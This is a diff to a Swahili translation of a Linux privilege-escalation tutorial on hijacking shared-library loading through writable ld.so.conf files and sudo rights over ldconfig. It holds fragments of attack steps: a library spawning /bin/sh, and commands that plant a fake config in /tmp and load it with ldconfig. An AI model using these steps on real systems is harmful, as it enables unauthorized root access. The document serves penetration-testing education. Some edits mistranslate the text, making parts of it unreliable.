@@ -83,7 +83,7 @@ system("/bin/sh",NULL,NULL);
 ```
 Sasa kwamba tumekuwa **tumetengeneza maktaba ya libcustom yenye madhara ndani ya** njia isiyo sahihi, tunahitaji kusubiri kwa **kuanzisha upya** au kwa mtumiaji wa root kutekeleza **`ldconfig`** (_ikiwa unaweza kutekeleza hii binary kama **sudo** au ina **suid bit** utaweza kuitekeleza mwenyewe_).
 
-Mara hii itakapofanyika **angalia tena** wapi `sharevuln` executable inachota maktaba ya `libcustom.so`:
+Mara hii itakapofanyika **angalia tena** ambapo `sharevuln` executable inachota maktaba ya `libcustom.so` kutoka:
 ```c
 $ldd sharedvuln
 linux-vdso.so.1 =>  (0x00007ffeee766000)
@@ -104,21 +104,21 @@ ubuntu
 
 ### Mipangilio mingine isiyo sahihi - Uthibitisho sawa
 
-Katika mfano wa awali tulifanya kama kuna mipangilio isiyo sahihi ambapo msimamizi **aliweka folda isiyo na mamlaka ndani ya faili ya usanidi ndani ya `/etc/ld.so.conf.d/`**.\
-Lakini kuna mipangilio mingine isiyo sahihi ambayo inaweza kusababisha udhaifu sawa, ikiwa una **idhini za kuandika** katika baadhi ya **faili za usanidi** ndani ya `/etc/ld.so.conf.d`, katika folda `/etc/ld.so.conf.d` au katika faili `/etc/ld.so.conf` unaweza kuunda udhaifu sawa na kuutumia.
+Katika mfano wa awali tulifanya uongo kuhusu mipangilio isiyo sahihi ambapo msimamizi **aliweka folda isiyo na mamlaka ndani ya faili ya mipangilio ndani ya `/etc/ld.so.conf.d/`**.\
+Lakini kuna mipangilio mingine isiyo sahihi ambayo inaweza kusababisha udhaifu sawa, ikiwa una **idhini za kuandika** katika baadhi ya **faili za mipangilio** ndani ya `/etc/ld.so.conf.d`, katika folda `/etc/ld.so.conf.d` au katika faili `/etc/ld.so.conf` unaweza kuunda udhaifu sawa na kuutumia.
 
 ## Exploit 2
 
 **Fikiria una mamlaka ya sudo juu ya `ldconfig`**.\
-Unaweza kuonyesha `ldconfig` **wapi kupakia faili za usanidi**, hivyo tunaweza kutumia fursa hii kufanya `ldconfig` ipakie folda zisizo za kawaida.\
+Unaweza kuonyesha `ldconfig` **wapi kupakia faili za mipangilio**, hivyo tunaweza kutumia fursa hii kufanya `ldconfig` ipakie folda zisizo na mipaka.\
 Hivyo, hebu tuunde faili na folda zinazohitajika kupakia "/tmp":
 ```bash
 cd /tmp
 echo "include /tmp/conf/*" > fake.ld.so.conf
 echo "/tmp" > conf/evil.conf
 ```
-Sasa, kama ilivyoonyeshwa katika **kuvunjika kwa awali**, **unda maktaba mbaya ndani ya `/tmp`**.\
-Na hatimaye, hebu tupakue njia na kuangalia ni wapi binary inayo pakua maktaba kutoka:
+Sasa, kama ilivyoonyeshwa katika **kuvunjika kwa awali**, **unda maktaba ya uhalifu ndani ya `/tmp`**.\
+Na hatimaye, hebu tupakue njia na kuangalia ni wapi binary inayo pakua maktaba hiyo:
 ```bash
 ldconfig -f fake.ld.so.conf
 
